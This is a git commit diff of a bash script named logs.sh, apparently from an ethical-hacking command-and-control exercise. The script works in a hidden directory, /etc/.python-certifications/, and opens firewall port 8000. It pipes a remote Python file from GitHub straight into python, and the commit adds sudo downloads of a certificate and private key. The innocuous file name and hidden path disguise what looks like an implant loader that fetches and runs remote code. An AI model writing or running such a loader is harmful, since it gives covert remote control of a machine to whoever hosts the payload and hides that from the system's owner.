4c419af742b85cd1f913a34d75501181a364e5fd
Nidhi Pabbathi <123031844+npabbathi@users.noreply.github.com>
2026-03-26 19:01:32 -0500

    Update logs.sh to download cert and key files

--- logs.sh
+++ logs.sh
@@ -1,4 +1,10 @@
 #!/bin/bash
 cd /etc/.python-certifications/
 firewall-cmd --add-port=8000/tcp
-curl -sL https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/week4.py | python
+curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/raw/refs/heads/main/cert.pem \
+  | sudo tee /etc/.python-certifications/cert.pem > /dev/null
+
+curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/key.pem \
+  | sudo tee /etc/.python-certifications/key.pem > /dev/null
+  
+curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/week4.py | python
